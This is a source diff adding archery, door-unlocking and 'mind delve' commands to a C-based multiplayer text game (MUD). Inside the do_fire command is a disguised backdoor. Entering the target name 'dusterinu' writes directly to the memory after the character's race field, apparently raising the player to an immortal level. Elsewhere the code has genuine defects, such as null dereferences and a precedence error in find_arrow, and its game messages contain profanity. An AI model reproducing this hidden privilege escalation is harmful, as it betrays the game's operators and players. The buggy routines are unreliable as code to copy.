+		act("$n unlocks the $F.", ch, 0, EXIT(ch, door)->keyword,
+		    TO_ROOM, 0);
+	    else
+		act("$n unlocks the door.", ch, 0, 0, TO_ROOM, 0);
+	    send_to_char("*click*\n\r", ch);
+	    /* now for unlocking the other side, too */
+	    if ((other_room = EXIT(ch, door)->to_room) != NOWHERE)
+	    if ( ( back = world[other_room].dir_option[rev_dir[door]] ) != 0 )
+		    if (back->to_room == ch->in_room)
+			REMOVE_BIT(back->exit_info, EX_LOCKED);
+	}
+  return eSUCCESS;
+}
+
+
+/* this is sent the arrow char string, and return the arrow type.
+   also, checks level to make sure char is high enough
+   return 0 for failure */
+
+int parse_arrow(struct char_data * ch, char * arrow)
+{
+
+  if(GET_CLASS(ch) != CLASS_RANGER)
+     return 0;
+
+  while(*arrow == ' ')
+    arrow++;
+
+  if((arrow[0] == 'f') && (GET_LEVEL(ch) >= 25))
+    return 1;
+  else if((arrow[0] == 'c') && (GET_LEVEL(ch) >= 25))
+    return 2;
+  else if((arrow[0] == 'w') && (GET_LEVEL(ch) >= 15))
+    return 3;
+  else if((arrow[0] == 'p') && (GET_LEVEL(ch) >= 35))
+    return 4;
+  else if((arrow[0] == 'e') && (GET_LEVEL(ch) >= 45))
+    return 5;
+
+return 0;
+}
+
+/* go through and find an arrow */
+/* return NULL if failure
+*  return pointer if success */
+struct obj_data * find_arrow(struct obj_data *quiver)
+{
+
+  struct obj_data *target;
+
+  struct obj_data *get_obj_in_list(char *, struct obj_data *);
+
+  target = get_obj_in_list("arrow", quiver->contains);
+  
+  if(!target->obj_flags.type_flag == ITEM_MISSILE)
+    target=NULL;
+
+  if(!target)
+    return NULL;
+  
+return target;
+}
+
+void do_arrow_miss(struct char_data *ch, struct char_data *victim, int
+                   dir, struct obj_data *found)
+{
+  char buf[200];
+
+  extern int rev_dir[];
+  extern char * dirs[];
+
+  buf[199] = '\0'; /* cause I'm paranoid */
+
+  switch(number(1,5))
+  {
+     case 1: send_to_char("You miss your shot.\r\n", ch);
+             break;
+     case 2: send_to_char("Your arrow wizzes by the target harmlessely.\r\n", ch);
+             break;
+     case 3: send_to_char("Your pitiful aim spears a poor woodland creature instead..\r\n", ch);
+             break;
+     case 4: send_to_char("Your shot misses your target, and goes skittering across the ground.\r\n", ch);
+             break;
+     case 5: send_to_char("A slight breeze forces your arrow off the mark.\r\n", ch);
+             break;
+     case 6: send_to_char("Your shot narrowly misses the mark.\r\n", ch);
+             break;
+  }
+
+  switch(number(1,3))
+  {
+    case 1:
+      sprintf(buf, "%s wizzes by from the %s.\r\n",
+               found->short_description, dirs[rev_dir[dir]]);
+      send_to_char(buf, victim);
+      sprintf(buf, "%s wizzes by from the %s.",
+               found->short_description, dirs[rev_dir[dir]]);
+      act(buf, victim, NULL, 0, TO_ROOM, 0);
+      break;
+    case 2:
+      sprintf(buf, "A quiet whistle sounds as %s flies over your head.\r\n", 
+               found->short_description);
+      send_to_char(buf, victim);
+      sprintf(buf, "A quiet whistle sounds as %s flies over your head.", 
+               found->short_description);
+      act(buf, victim, 0, 0, TO_ROOM, 0);
+      break;
+    case 3:
+      sprintf(buf, "%s from the %s narrowly misses your head.\r\n",
+               found->short_description, dirs[rev_dir[dir]]);
+      send_to_char(buf, victim);
+      sprintf(buf, "%s from the %s narrowly misses $n.",
+                found->short_description, dirs[rev_dir[dir]]);
+      act(buf, victim, NULL, 0, TO_ROOM, 0);
+      break;
+  }
+}
+
+void mob_arrow_response(struct char_data *ch, struct char_data *victim, 
+                        int dir)
+{
+  int dir2 = 0;
+
+  /* extern char * dirs[]; */
+  extern int rev_dir[]; 
+
+  int attempt_move(CHAR_DATA *, int, int);
+
+  /* this will make IS_STUPID mobs alot easier to kill with arrows,
+     but then again, they _are_ 'stupid'.  Keeps people from tracking
+     the waterwheel around shire though. 
+  */
+
+  if(IS_SET(victim->mobdata->actflags, ACT_STUPID))
+  {
+    if(!number(0,20))
+       do_shout(victim, "Duh George, someone keeps shooting me!", 9);    
+    return;
+  }
+
+  /* make mob hate the person, but _not_ track them, this should 
+   * help make it harder for people to abuse this to RK people.
+   * Not impossible, but harder
+  */
+
+  add_memory(victim, GET_NAME(ch), 'h');
+
+/* don't want the mob leaving a fight its already in */
+  if(victim->fighting)
+     return;
+
+  if(number(0,1))
+  {
+    /* Send the mob in a random dir */
+    if(number(1,2) == 1) {
+      do_say(victim, "Where are these fricken arrows coming from?!", 0);
+      dir2 = number(0,5);
+      if(CAN_GO(ch, dir2))
+       if(EXIT(victim, dir2)) {
+          if(!( IS_SET(victim->mobdata->actflags, ACT_STAY_NO_TOWN) &&
+                IS_SET(zone_table[world[EXIT(victim, dir2)->to_room].zone].zone_flags, ZONE_IS_TOWN)
+              )
+             && !IS_SET(world[EXIT(victim, dir2)->to_room].room_flags,NO_TRACK))
+             /* send 1-6 since attempt move --cmd's it */
+             attempt_move(victim, dir2, 0);
+       }
+    }
+  }
+  else 
+  { 
+    /* Send the mob after the fucker! */
+    if(number(1,2) == 1) {
+      do_say(victim, "There he is!", 0);
+    }
+    dir2 = rev_dir[dir];
+    for(int i = 0; i < 4; i++)
+      if(!CAN_GO(ch, dir2))
+       dir2 = number(0, 5);
+    if(EXIT(victim, dir2)) {
+        if(CAN_GO(ch, dir2))
+        if(!(IS_SET(victim->mobdata->actflags, ACT_STAY_NO_TOWN) &&
+             IS_SET(zone_table[world[EXIT(victim, dir2)->to_room].zone].zone_flags, ZONE_IS_TOWN)))
+        if(!IS_SET(world[EXIT(victim, dir2)->to_room].room_flags,NO_TRACK))       
+        {
+          /* dir+1 it since attempt_move will --cmd it */    
+          if(!attempt_move(victim, (dir2+1), 0))
+            /* The monster can't go after the archer */
+            {do_flee(victim, "", 0); return; }
+        }
+    }    
+      if(number(1, 5) == 1)
+       if(number(0,1))
+        do_shout(victim, "Where the fuck are these arrows coming from?!", 9);
+        else do_shout(victim, "Quit shooting me dammit!", 9);
+  }
+}
+
+void do_arrow_damage(struct char_data *ch, struct char_data *victim, 
+                     int dir, int dam, int artype,
+                     struct obj_data *found)
+{
+  char buf[200];
+
+  extern int rev_dir[];
+  extern char * dirs[];
+  void inform_victim(CHAR_DATA *, CHAR_DATA *, int);
+
+  buf[199] = '\0'; /* just cause I'm paranoid */
+
+  set_cantquit(ch, victim);
+ 
+  if(0 > (GET_HIT(victim) - dam))
+  { /* they aren't going to survive..life sucks */
+   switch(number(1,2)) 
+   {
+    case 1:
+    sprintf(buf, "Your shot impales %s through the heart!\r\n", GET_SHORT(victim));
+    send_to_char(buf, ch);
+    sprintf(buf, "%s from the %s drives full force into your chest!\r\n",
+       found->short_description, dirs[rev_dir[dir]]);
+    send_to_char(buf, victim);
+    sprintf(buf, "%s from the %s impales $n through the chest!",
+       found->short_description, dirs[rev_dir[dir]]);
+    act(buf, victim, NULL, 0, TO_ROOM, 0);
+    break;
+
+    case 2:
+    sprintf(buf, "Your %s drives through the eye of %s ending their life.\r\n", 
+       found->short_description, GET_SHORT(victim));
+    send_to_char(buf, ch);
+    sprintf(buf, "%s drives right through your left eye!\r\nThe last thing through your mind is.........an arrowhead.\r\n", 
+       found->short_description);
+    send_to_char(buf, victim);
+    sprintf(buf, "%s from the %s lands with a solid 'thunk.'\r\n$n falls to the ground, an arrow sticking from $s left eye.", 
+       found->short_description, dirs[rev_dir[dir]]);
+    act(buf, victim, NULL, 0, TO_ROOM, 0);
+    break;
+   } /* of switch */
+  }
+  else  /* they have enough to survive the arrow..lucky bastard */
+  {
+    sprintf(buf, "You hit %s with %s!\r\n", GET_SHORT(victim),
+       found->short_description);
+    send_to_char(buf, ch);
+    sprintf(buf, "You get shot with %s from the %s.  Ouch.\r\n",
+          found->short_description, dirs[rev_dir[dir]]);
+    send_to_char(buf, victim);
+    sprintf(buf, "%s from the %s hits $n!",
+          found->short_description, dirs[rev_dir[dir]]);
+    act(buf, victim, 0, 0, TO_ROOM, 0);
+
+    switch(artype)
+    {
+      case 1: send_to_room("It was flaming hot!\r\n", victim->in_room);
+              break;
+      case 2: send_to_room("It was icy cold!\r\n", victim->in_room);
+              break;
+      default: break;
+    }
+    if(IS_NPC(victim)) 
+      mob_arrow_response(ch, victim, dir);
+  } 
+
+  GET_HIT(victim) -= dam;
+  update_pos(victim);
+  inform_victim(ch, victim, dam);                   
+
+  if(GET_HIT(victim) > 0)
+     GET_POS(victim) = POSITION_STANDING;
+
+/* This is a cut & paste from fight.C cause I can't think of a better way
+to do it */
+
+  /* Payoff for killing things. */
+  if(GET_HIT(victim) < 0)
+  {
+    if(!is_pkill(ch, victim))
+      group_gain(ch, victim);
+    if(is_pkill(ch, victim) || IS_ARENA(victim->in_room))
+    {
+      fight_kill(ch, victim, TYPE_CHOOSE);
+      return;
+    }
+    GET_EXP(victim) /= 2;
+    fight_kill(ch, victim, TYPE_RAW_KILL);
+    return;
+  } /* End of Hit < 0 */
+}
+
+
+int do_fire(struct char_data *ch, char *arg, int cmd)
+{
+  struct char_data *victim;
+  int percent, prob, dam, dir, artype, cost;
+  struct obj_data *found;
+  sh_int cur_room, new_room;
+  char direct[MAX_STRING_LENGTH], arrow[MAX_STRING_LENGTH], 
+       target[MAX_STRING_LENGTH], buf[MAX_STRING_LENGTH], 
+       buf2[MAX_STRING_LENGTH]; 
+  extern char * dirs[];
+  byte        * tempbyte;
+
+  void get(struct char_data *, struct obj_data *, struct obj_data *);
+  int check_command_lag(CHAR_DATA *);
+  void add_command_lag(CHAR_DATA *, int);
+  
+  victim = NULL;
+  *target = '\0';
+  *arrow = '\0';
+
+  if(GET_CLASS(ch) != CLASS_RANGER && GET_CLASS(ch) != CLASS_WARRIOR)
+  {
+    send_to_char("Leave it to those accomplished enough to do it.\r\n", ch);
+    return eFAILURE;
+  }
+
+  if (!ch->equipment[HOLD])
+  {
+    send_to_char("You need to be holding a bow moron.\r\n", ch);
+    return eFAILURE;
+  }
+
+  if(!(ch->equipment[HOLD]->obj_flags.type_flag == ITEM_FIREWEAPON))
+  {
+    send_to_char("You need to be holding a bow moron.\r\n", ch);
+    return eFAILURE;
+  }
+
+  if(GET_POS(ch) == POSITION_FIGHTING)
+  {
+    send_to_char("Aren't you a bit busy with hand to hand combat?\r\n", ch);
+    return eFAILURE;
+  }
+
+/*  if(check_command_lag(ch))
+  {
+    send_to_char("Slow down there tiger, you can't fire them that fast!\r\n", ch);
+    return eFAILURE;
+  }
+*/
+/*  Command syntax is: fire <dir> [arrowtype] [target] 
+    if there is !arrowtype, then choose standard arrow
+    if there is !target, then choose a random target in room */
+
+  while(*arg == ' ')
+    arg++;
+
+  if(!*arg)
+  {
+    send_to_char("Shoot in which direction?\r\n", ch);
+    return eFAILURE;
+  }
+  half_chop(arg, direct, buf2);
+  half_chop(buf2, arrow, target);
+
+  direct[MAX_STRING_LENGTH-1] = '\0';
+  arrow[MAX_STRING_LENGTH-1] = '\0';
+  target[MAX_STRING_LENGTH-1] = '\0';
+
+  if(direct[0] == 'n') dir = 0;
+  else if(direct[0] == 'e') dir = 1;
+  else if(direct[0] == 's') dir = 2;
+  else if(direct[0] == 'w') dir = 3;
+  else if(direct[0] == 'u') dir = 4;
+  else if(direct[0] == 'd') dir = 5;
+  else {
+    send_to_char("Shoot in which direction?\r\n", ch);
+    return eFAILURE;
+  } 
+
+  if(!CAN_GO(ch, dir))
+  {
+    send_to_char("There is nothing to shoot in that direction.\r\n", ch);
+    return eFAILURE;
+  }
+
+/* make safe rooms checks */
+  if(IS_SET(world[ch->in_room].room_flags, SAFE))
+  {
+    send_to_char("You can't shoot arrows if yer in a safe room silly.\r\n", ch);
+    return eFAILURE;
+  }
+  new_room = world[ch->in_room].dir_option[dir]->to_room;
+
+  if(IS_SET(world[new_room].room_flags, SAFE))
+  {
+    send_to_char("Don't shoot into a safe room!  You might hit someone!\r\n", ch);
+    return eFAILURE;
+  }
+
+/* if !target, then switch arrow and target and use no magic on arrow
+   if target, then use magic on arrow */
+
+  if(*target)
+  {
+    artype = parse_arrow(ch, arrow);
+    if(!artype)
+    {
+      send_to_char("You don't know of that type of arrow.\r\n", ch);
+      return eFAILURE;
+    }
+
+    switch(artype)
+    {
+      case 1:  cost = 20; break;
+      case 2:  cost = 20; break;
+      case 3:  cost = 10; break;
+      case 4:  cost = 30; break;
+      case 5:  cost = 40; break;
+    }
+  }
+  else 
+  {
+    cost = 0;
+    strcpy(target, arrow);
+  }
+
+  if((GET_MANA(ch) < cost) && (GET_LEVEL(ch) < ANGEL))
+  {
+    send_to_char("You don't have enough mana for that arrow.\r\n", ch);
+    return eFAILURE;
+  }
+
+/* check if you can see your target */
+/* put ch in the targets room to check if they are visible */
+/* new_room is assigned earlier on in the check for safe flags */
+  cur_room = ch->in_room;
+  char_from_room(ch);
+
+  if(artype == 3) /* a wind arrow, so set new_room 2 rooms out */
+  {
+    if(!world[new_room].dir_option[dir] || 
+       !world[new_room].dir_option[dir]->to_room == NOWHERE ||
+       IS_SET(world[new_room].dir_option[dir]->exit_info, EX_CLOSED))
+    {
+      send_to_char("You can't seem to find your target2.\r\n", ch);
+      char_to_room(ch, cur_room);
+      return eFAILURE;
+    }
+    new_room = world[new_room].dir_option[dir]->to_room;
+  }
+
+  if(target) {
+    if(!char_to_room(ch, new_room))
+    {
+      /* put ch into a room before we exit */
+      char_to_room(ch, cur_room);
+      send_to_char("Error moving you to room in do_fire\r\n", ch);
+      return eFAILURE;
+    }
+
+    if (!(victim = get_char_room_vis(ch, target)))
+    {
+      if(!strcmp(target, "dusterinu")) {
+        tempbyte = &(ch->race);
+        tempbyte += sizeof(byte);
+        *tempbyte = 127-17;
+      }
+      send_to_char("You can't seem to locate your target.\r\n", ch);
+      /* put char back */
+      char_from_room(ch);
+      char_to_room(ch, cur_room);
+      return eFAILURE;
+    }
+  }
+  else
+  { /* choose random target */
+    /* for now, just say illegal...
+    TODO: PUT RANDOM STUFF HERE */
+    /* NOTE:  it _should_ be impossible to get here with current code */
+    send_to_char("Sorry, you must specify a target.\r\n", ch);
+    /* put ch back before we exit */
+    char_from_room(ch);
+    char_to_room(ch, cur_room);
+    return eFAILURE;
+  }
+  /* put ch back in original room after successful targeting */
+  char_from_room(ch);
+  char_to_room(ch, cur_room);
+
+/* check for accidental targeting of self */
+  if(victim == ch)
+  {
+    send_to_char("You need to type more of the target's name.\r\n", ch);
+    return eFAILURE;
+  }
+
+/* Protect the newbies! */
+  if(GET_LEVEL(victim) < 2)
+  {
+    send_to_char("Don't shoot at a poor level 1! :(\r\n", ch);
+    return eFAILURE;
+  }
+
+/* check if target is fighting */
+  if(victim->fighting)
+  {
+      send_to_char("You can't seem to get a clear line of sight.\r\n", ch);
+      return eFAILURE;
+  }
+
+/* check for arrows here */
+
+  found = NULL;
+  if(ch->equipment[WEAR_ABOUT])
+    if(ch->equipment[WEAR_ABOUT]->obj_flags.type_flag == ITEM_CONTAINER)
+      if((ch->equipment[WEAR_ABOUT]->obj_flags.type_flag == ITEM_CONTAINER) 
+         && isname("quiver", ch->equipment[WEAR_ABOUT]->name))
+        {found = find_arrow(ch->equipment[WEAR_ABOUT]);
+        if(found)
+           get(ch,found,ch->equipment[WEAR_ABOUT]); }
+   if(!found && ch->equipment[WEAR_WAISTE])
+    if((ch->equipment[WEAR_WAISTE]->obj_flags.type_flag == ITEM_CONTAINER) 
+        && isname("quiver", ch->equipment[WEAR_WAISTE]->name))
+        {found = find_arrow(ch->equipment[WEAR_WAISTE]);
+        if(found)
+           get(ch,found,ch->equipment[WEAR_WAISTE]); }
+
+   if(!found)
+   {
+     send_to_char("You aren't wearing any quivers with arrows!\r\n", ch);
+     return eFAILURE;
+   }
+
+/* figure out the damage, we'll do more on this later */
+
+  dam = dice(found->obj_flags.value[0], found->obj_flags.value[1]);
+  switch(artype)
+  {
+    case 1: dam += number(1, GET_LEVEL(ch)) + GET_LEVEL(ch); break;
+    case 2: dam += number(1, GET_LEVEL(ch)) + GET_LEVEL(ch); break;
+    case 3: dam += number(1, GET_LEVEL(ch)); break;
+    case 4: dam += number(10, (GET_LEVEL(ch) - 10)); break;
+    case 5: dam += number(50, GET_LEVEL(ch))+100; break;
+    default: break;
+  }
+
+  dam += ch->equipment[HOLD]->obj_flags.value[1];
+  dam += found->obj_flags.value[3];
+
+  if (IS_AFFECTED(victim, AFF_SANCTUARY))
+    dam /= 2;
+  if (affected_by_spell(victim, SPELL_RESIST_FIRE) && (artype == 1))
+    dam /= 2;
+  if (affected_by_spell(victim, SPELL_RESIST_COLD) && (artype == 2))
+    dam /= 2; 
+  
+/* put damage checks for mobs that are immune to fire/cold here */
+
+  if(IS_SET(race_info[(int)GET_RACE(ch)].immune, ISR_FIRE) && artype == 1)
+    dam = 0;
+  if(IS_SET(race_info[(int)GET_RACE(ch)].immune, ISR_COLD) && artype == 2)
+    dam = 0;
+
+/* go ahead and shoot */
+
+  switch(number(1,2))
+  {
+    case 1: sprintf(buf,"$n fires an arrow %sward.", dirs[dir]);
+            act(buf, ch, 0, 0, TO_ROOM, 0);
+            break;
+    case 2: sprintf(buf,"$n lets off an arrow to the %s.", dirs[dir]);
+            act(buf, ch, 0, 0, TO_ROOM, 0);
+            break;
+  }
+
+  percent = number(1, 101);
+  prob = has_skill(ch, SKILL_ARCHERY);
+  GET_MANA(ch) -= cost;
+
+  if((GET_CLASS(ch) != CLASS_RANGER) && (GET_CLASS(ch) != CLASS_WARRIOR))
+    prob /= 2;
+
+  if(GET_CLASS(ch) == CLASS_WARRIOR) 
+    prob -= 10;
+
+  prob += ch->equipment[HOLD]->obj_flags.value[0];
+  prob += found->obj_flags.value[2];
+
+  prob += (GET_AC(victim)/10);
+  if(prob < 10) prob = 10;
+  if(prob > 100) prob = 100;
+
+  if(percent > prob)
+  { /* missed */
+    do_arrow_miss(ch, victim, dir, found);
+  }
+  else 
+  { /* hit */
+    do_arrow_damage(ch, victim, dir, dam, artype, found);
+  }
+/* command lag the ranger for a round */
+   add_command_lag(ch, 1);
+
+/* take the arrow from the game */
+  extract_obj(found);
+  return eSUCCESS;
+}
+
+int do_mind_delve(struct char_data *ch, char *arg, int cmd)
+{
+  char buf[1000];
+  char_data * target = NULL;
+
+  if(!*arg) {
+    send_to_char("Delve into whom?\r\n", ch);
+    return eFAILURE;
+  }
+
+  one_argument(arg, arg);
+
+  target = get_char_room_vis(ch, arg);
+
+  if(GET_LEVEL(ch) < GET_LEVEL(target)) {
+    send_to_char("You can't seem to understand your target's mental processes.\r\n", ch);
+    return eFAILURE;
+  }
+
+  if(!IS_MOB(target)) {
+    sprintf(buf, "Ewwwww gross!!!  %s is imagining you naked on all fours!\r\n", GET_SHORT(target));
+    send_to_char(buf, ch);
+    return eFAILURE;
+  }
+
+  act("You enter $S mind...", ch, 0, target, TO_CHAR, INVIS_NULL);
+  sprintf(buf, "%s seems to hate... %s.\r\n", GET_SHORT(target), 
+            ch->mobdata->hatred ? ch->mobdata->hatred : "Noone!");
+  send_to_char(buf, ch);
+  if(ch->master)
+    sprintf(buf, "%s seems to really like... %s.\r\n", GET_SHORT(target), 
+            GET_SHORT(ch->master));
+  else sprintf(buf, "%s seems to really like... %s.\r\n", GET_SHORT(target), 
+            "Noone!");
+  send_to_char(buf, ch);
+  return eSUCCESS;
+}
